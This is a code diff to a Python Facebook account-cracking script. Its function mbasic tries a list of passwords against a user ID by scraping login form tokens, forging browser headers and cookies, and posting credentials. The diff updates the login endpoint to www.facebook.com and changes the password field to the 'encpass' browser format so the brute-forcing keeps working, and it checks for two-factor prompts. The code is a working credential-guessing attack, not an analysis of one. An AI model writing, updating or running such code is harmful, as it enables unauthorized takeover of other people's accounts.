@@ -1227,7 +1227,7 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = Session.get('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1252,7 +1252,7 @@ def mbasic(uid,pwx,tl):
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'true',
             'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAfAAAAAAAAAAAAAAAAAAP/vPPffPAABFAL',
-            'pass': pw,}
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw)}
             cookies = {
             'datr': 'DQQ-Z3Sl1kkwp5eJPjAonnEo',
             'sb': 'DQQ-Z2ztbMJmdxyVIlGZ0ZEN',
@@ -1262,7 +1262,7 @@ def mbasic(uid,pwx,tl):
             'fr': '0c3x4NhqzBoN0oJpn.AWWV8F980sRicDtaHFFGFQEKhCw.BnPBZf..AAA.0.0.BnS1Ku.AWXmjKFQa8k',
             'wd': '995x773',}
             headers = {
-            "Host": "touch.facebook.com",
+            "Host": "www.facebook.com",
             "content-length": str(len("&".join(["%s=%s"%(x,y) for x,y in data.items()]))),
             "cache-control": "max-age=0",
             "dpr": "2",
@@ -1275,7 +1275,7 @@ def mbasic(uid,pwx,tl):
             "sec-ch-ua-full-version-list": '"Chromium";v="130.0.6723.117", "Google Chrome";v="130.0.6723.117", "Not?A_Brand";v="99.0.0.0"',
             "sec-ch-prefers-color-scheme": "light",
             "upgrade-insecure-requests": "1",
-            "origin": "https://touch.facebook.com",
+            "origin": "https://www.facebook.com",
             "content-type": "application/x-www-form-urlencoded",
             "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -1283,7 +1283,7 @@ def mbasic(uid,pwx,tl):
             "sec-fetch-mode": "navigate",
             "sec-fetch-user": "?1",
             "sec-fetch-dest": "document",
-            "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
+            "referer": "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.12%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D449838951736891%26redirect_uri%3Dhttps%253A%252F%252Fauth.opera.com%252Faccount%252Fsocial%252Fv4%252Fcallback%26scope%3Demail%26state%3DWNahsU1RWERN7c2kB19ybSBubJJbYt%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1fd7fa3b-14b0-4263-95e2-bc18735b0567%26tp%3Dunspecified%26cbt%3D1732989615693&lwv=100",
             "accept-encoding": "gzip, deflate, br",
             "accept-language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
